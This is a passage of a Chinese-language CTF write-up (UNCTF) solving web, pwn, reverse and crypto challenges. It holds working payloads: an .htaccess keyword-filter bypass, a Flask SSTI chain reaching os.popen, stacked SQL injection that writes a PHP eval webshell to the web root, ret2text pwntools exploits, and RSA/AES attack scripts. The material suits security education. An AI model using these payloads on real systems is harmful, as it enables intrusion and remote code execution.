class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现不成功，那么<code>username</code>和<code>password</code>需要的实际字符串应该不对。</p><p>if判断条件出用的是<code>==</code>弱类型比较，PHP中<code>任意字符串==true</code>结果都为<code>true</code>，更换构造值为bool类型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="literal">true</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST提交payload，得到flag。</p><p>​    </p><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><blockquote><p>随便上传</p></blockquote><p>De1ctf 2020-Check in原题。</p><p>随便传一个jpg文件，回显过滤<code>perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet in contents!</code></p><p>上传.htaccess文件，bp改包，用换行绕过关键字过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler p\</span><br><span class="line">hp5-script .txt</span><br><span class="line">p\</span><br><span class="line">hp_value au\</span><br><span class="line">to_append_file /flag</span><br></pre></td></tr></table></figure><p>再随便传一个txt文件，访问对应路径即加载得到/flag内容。</p><p>​    </p><h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><p>进入提示<code>a easy flask problem,first login as the admin</code>，</p><p>访问<code>/login</code>登录，尝试<code>admin/admin</code>登录，提示<code>login fail! check /register</code>，</p><p>访问<code>/register</code>注册，用<code>admin/admin</code>注册，提示<code>register success</code>，注册成功，</p><p>回到登录页登录，提示<code>admin login success!</code>，</p><p>再回到主页，发现提示变为<code>admin login success and check the secret route /secret_route_you_do_not_know</code></p><p>访问<code>/secret_route_you_do_not_know</code>，提示<code>you should &#39;guess&#39; the secret number</code></p><p>GET方式传入<code>?guess=&#123;&#123;3*5&#125;&#125;</code>，回显<code>15 error!!</code>，存在SSTI漏洞。</p><p>fuzz一波，发现过滤了<code>[]</code>、<code>_</code>、<code>&quot;</code>、<code>&#39;</code>、<code>%</code>等，尝试用request外部参数方式，利用<code>&lt;class &#39;click.utils.LazyFile&#39;&gt;</code>类命令执行。</p><p>列目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;init=__init__&amp;g=__globals__&amp;mod=os&amp;func=popen&amp;cmd=ls&amp;re=read</span><br></pre></td></tr></table></figure><p>读文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)(request.args.file)|attr(request.args.re)()&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;file=flag.txt&amp;re=read</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h3><blockquote><p>非常简单的sql 0.0</p><p>提示1：flag不在数据库中。。</p></blockquote><p>强网杯 2019-随便注原题魔改。</p><p><code>1&#39; or 1=1 #</code>，查看返回数据</p><p><code>1&#39; order by 2 #</code>，查列数</p><p><code>1&#39; union select 1,2 #</code>，失败，说明有正则过滤</p><p><code>1&#39;; show databases;#</code>，堆叠注入查数据库</p><p><code>1&#39;; show tables;#</code>，堆叠注入查表</p><p><code>1&#39;; show columns from 0xDktb;#</code>，堆叠注入查数据库</p><p>用预处理语句查询结果（<code>select * from `0xDktb` </code>）：</p><p><code>1&#39;; set@a=0x73656c656374202a2066726f6d20603078446b746260; prepare execsql from @a;execute execsql;#</code>，失败，说明有关键字被过滤，尝试发现是<code>set</code>关键字</p><p>改为：</p><p><code>1&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;#</code>，成功查询，但不是flag，更换查询内容，找了整个数据库都未发现flag字符串。</p><p>猜测flag在文件系统里，尝试写文件（<code>select &#39;&lt;?php @eval($_POST[ccc]);?&gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;</code>）：</p><p><code>1&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;#</code></p><p>用蚁剑试连，发现成功，在根目录拿到flag。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h3><blockquote><p>守护世界上最好的YLB<br>nc 45.158.33.12 8000</p></blockquote><p>先nc，提示用pwntool，运行脚本拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;45.158.33.12&#x27;</span>, <span class="number">8000</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="fan"><a href="#fan" class="headerlink" title="fan"></a>fan</h3><p>简单ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">48548</span>)</span><br><span class="line">system_addr=<span class="number">0x400735</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>) + p64(system_addr)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;input your message\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="do-you-like-me"><a href="#do-you-like-me" class="headerlink" title="do_you_like_me?"></a>do_you_like_me?</h3><p>简单ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">46506</span>)</span><br><span class="line">system_addr=<span class="number">0x4006CD</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(system_addr)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give me your input : &#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="re-checkin"><a href="#re-checkin" class="headerlink" title="re_checkin"></a>re_checkin</h3><blockquote><p>二进制手做不出来这个就考虑退役吧</p></blockquote><p>IDA打开，定位到<code>start</code>函数，再不断跟进到<code>sub_4015DC</code>发现flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004015DC sub_4015DC      proc near               </span><br><span class="line">.text:00000000004015DC arg_0           = qword ptr  10h</span><br><span class="line">.text:00000000004015DC</span><br><span class="line">.text:00000000004015DC                 push    rbp</span><br><span class="line">.text:00000000004015DD                 mov     rbp, rsp</span><br><span class="line">.text:00000000004015E0                 mov     [rbp+arg_0], rcx</span><br><span class="line">.text:00000000004015E4                 mov     cs:Str2, &#x27;u&#x27;</span><br><span class="line">.text:00000000004015EB                 mov     cs:byte_42F041, &#x27;n&#x27;</span><br><span class="line">.text:00000000004015F2                 mov     cs:byte_42F042, &#x27;c&#x27;</span><br><span class="line">.text:00000000004015F9                 mov     cs:byte_42F043, &#x27;t&#x27;</span><br><span class="line">.text:0000000000401600                 mov     cs:byte_42F044, &#x27;f&#x27;</span><br><span class="line">.text:0000000000401607                 mov     cs:byte_42F045, &#x27;&#123;&#x27;</span><br><span class="line">.text:000000000040160E                 mov     cs:byte_42F046, &#x27;W&#x27;</span><br><span class="line">.text:0000000000401615                 mov     cs:byte_42F047, &#x27;e&#x27;</span><br><span class="line">.text:000000000040161C                 mov     cs:byte_42F048, &#x27;l&#x27;</span><br><span class="line">.text:0000000000401623                 mov     cs:byte_42F049, &#x27;c&#x27;</span><br><span class="line">.text:000000000040162A                 mov     cs:byte_42F04A, &#x27;o&#x27;</span><br><span class="line">.text:0000000000401631                 mov     cs:byte_42F04B, &#x27;m&#x27;</span><br><span class="line">.text:0000000000401638                 mov     cs:byte_42F04C, &#x27;e&#x27;</span><br><span class="line">.text:000000000040163F                 mov     cs:byte_42F04D, &#x27;T&#x27;</span><br><span class="line">.text:0000000000401646                 mov     cs:byte_42F04E, &#x27;o&#x27;</span><br><span class="line">.text:000000000040164D                 mov     cs:byte_42F04F, &#x27;U&#x27;</span><br><span class="line">.text:0000000000401654                 mov     cs:byte_42F050, &#x27;N&#x27;</span><br><span class="line">.text:000000000040165B                 mov     cs:byte_42F051, &#x27;C&#x27;</span><br><span class="line">.text:0000000000401662                 mov     cs:byte_42F052, &#x27;T&#x27;</span><br><span class="line">.text:0000000000401669                 mov     cs:byte_42F053, &#x27;F&#x27;</span><br><span class="line">.text:0000000000401670                 mov     cs:byte_42F054, &#x27;&#125;&#x27;</span><br><span class="line">.text:0000000000401677                 mov     cs:byte_42F055, 0</span><br><span class="line">.text:000000000040167E                 nop</span><br><span class="line">.text:000000000040167F                 pop     rbp</span><br><span class="line">.text:0000000000401680                 retn</span><br><span class="line">.text:0000000000401680 sub_4015DC      endp</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>用 pyinstxtractor反编译出pyc文件，再用uncompyle6反编译pyc可得源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="string">&#x27;UMAQBvogWLDTWgX&quot;&quot;&quot;k&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i]) + i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>运行得flag。</p><p>​    </p><h3 id="babypy"><a href="#babypy" class="headerlink" title="babypy"></a>babypy</h3><blockquote><p>Babypy.That’s really easy!!!</p></blockquote><p>用 pyinstxtractor反编译出pyc文件，再用uncompyle6反编译pyc可得源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, libnum, binascii</span><br><span class="line">flag = <span class="string">&#x27;unctf&#123;*******************&#125;&#x27;</span></span><br><span class="line">x = libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">x</span>):</span></span><br><span class="line">y = <span class="built_in">abs</span>(x)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">yield</span> y % <span class="number">2</span></span><br><span class="line">y = y &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">yield</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = [i <span class="keyword">for</span> i <span class="keyword">in</span> gen(x)]</span><br><span class="line">l.reverse()</span><br><span class="line">f = <span class="string">&#x27;%d&#x27;</span> * <span class="built_in">len</span>(l) % <span class="built_in">tuple</span>(l)</span><br><span class="line">a = binascii.b2a_hex(f.encode())</span><br><span class="line">b = <span class="built_in">int</span>(a, <span class="number">16</span>)</span><br><span class="line">c = <span class="built_in">hex</span>(b)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">os.system(<span class="string">&#x27;pause&#x27;</span>)</span><br></pre></td></tr></table></figure><p>代码逻辑为字符→10进制→2进制→字符16进制，txt文件16进制按逻辑逆推得到flag。</p><p>​    </p><h3 id="CTFilter"><a href="#CTFilter" class="headerlink" title="CTFilter"></a>CTFilter</h3><blockquote><p>假如你是李华，你的好友学习委员无意之间看到了一串flag！<br>这串flag极有可能是解开谜题的关键。<br>他立刻在一台装有Windows10 1903 x64操作系统的虚拟机中使用记事本写下了这串flag并保存。<br>然而，令他没想到的是，这个系统却另有玄机！<br>任何人都无法在这个系统中写下正确的flag？<br>请你以好友的身份对他伸出援手，帮助学习委员找到真正的flag。</p><p>学习委员：那你能帮帮我吗？<br>李华：瞧谁不起呢？</p></blockquote><p>压缩包里有CTFilter.sys、Hint.exe、Unknown_data、Story.txt四个文件，IDA分析前两个，CTFilter.sys查看没什么结果，Hint.exe中发现一个flag字符串<code>flag&#123;Oh!You_found_me~&#125;</code>，结合题干描述<code>这串flag极有可能是解开谜题的关键</code>，尝试将flag字符串作为key与密文Unknown_data异或，发现居然成功得到flag。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><p>给 $a,b,e$，易推出 $p$ 和 $q$，再按正常RSA解法解即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">a = <span class="number">320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168</span></span><br><span class="line">b = <span class="number">9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370</span></span><br><span class="line">p = (a+b)/<span class="number">2</span></span><br><span class="line">q = (a-b)/<span class="number">2</span></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">c = <span class="number">22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h3><blockquote><p>某日，鞍山大法官在点外卖时点了2个韭菜盒子，商家只送了1个，大法官给了该商家一个差评<br>次日，该大法官又在该商家点了1个韭菜盒子，希望商家能补上上次的韭菜盒子，而商家又只发了一个韭菜盒子<br>这名大法官一天正常要吃2个韭菜盒子，而该商家每天只给他1个韭菜盒子，请问该名大法官缺的营养这一块怎么补<br>ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto<br>flag格式：unctf{}</p></blockquote><p>尝试二进制转字符及摩斯密码均不成功，最后才想到培根密码，分别把o和t替换为A和B，在线解密得flag。</p><p>​    </p><h3 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h3><blockquote><p>你们都不会百度的吗</p></blockquote><p>只给出 $e,n,c$，且 $e$ 很大，简单的RSA Wiener攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_contfrac</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_contfrac</span>(<span class="params">frac</span>):</span></span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contfrac_to_rational</span> (<span class="params">frac</span>):</span></span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line">e= <span class="number">18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781</span></span><br><span class="line">n= <span class="number">147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701</span></span><br><span class="line">c= <span class="number">140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_inv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isqrt</span>(<span class="params">n</span>):</span></span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_rsa</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">d = crack_rsa(e, n)</span><br><span class="line">m = <span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, n))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(m))</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="wing"><a href="#wing" class="headerlink" title="wing"></a>wing</h3><blockquote><p>你过office二级了吗</p></blockquote><p>提示office，猜测为word中某种字体，打开word输入字母+数字，再切换各字体核对，发现为<code>Wingdings 2</code>字体，对照替换得flag。</p><p>​    </p><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><blockquote><p>Really baby problem about block cipher<br>flag 格式： flag{}</p></blockquote><p>AES-ECB模式两次加密，且密钥已知位较多，可采用中间人攻击（MITM）。</p><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify,unhexlify</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">alph = printable</span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag_c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">middle = <span class="built_in">dict</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> alph:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> alph:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> alph:</span><br><span class="line">            key1 = <span class="string">&#x27;%s%s%s%s&#x27;</span> % (<span class="string">&#x27;0&#x27;</span> * <span class="number">13</span>, x, y, z)</span><br><span class="line">            cipher = AES.new(key1)</span><br><span class="line">            middle.update(&#123;cipher.encrypt(m): key1&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nTable built...\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> alph:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> alph:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> alph:</span><br><span class="line">            key2 = <span class="string">&#x27;%s%s%s%s&#x27;</span> % (x, y, z, <span class="string">&#x27;0&#x27;</span> * <span class="number">13</span>)</span><br><span class="line">            cipher = AES.new(key2)</span><br><span class="line">            d = cipher.decrypt(c)</span><br><span class="line">            <span class="keyword">if</span> d <span class="keyword">in</span> middle:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;\nKeys found: %s; %s\nFlag:&quot;</span> % (middle[d].encode(<span class="string">&#x27;hex&#x27;</span>), key2.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">                cipher1 = AES.new(middle[d])</span><br><span class="line">                <span class="built_in">print</span> cipher1.decrypt(cipher.decrypt(flag_c))</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="快乐数学-0x00"><a href="#快乐数学-0x00" class="headerlink" title="快乐数学_0x00"></a>快乐数学_0x00</h3><blockquote><p>刚才我问扎克利，扎总发生甚么事了。扎总说怎么回事。我给扎总发了几张截图。<br>扎总一看，噢，原来是昨天，几个大学生，二十多岁，他们说，哎~。<br>有一个说，我在 UNCTF 打比赛，头都做疼了，扎总，你能不能教教我怎么做题，哎，帮我分数弄高一点。<br>扎总说，可以，你在 UNCTF 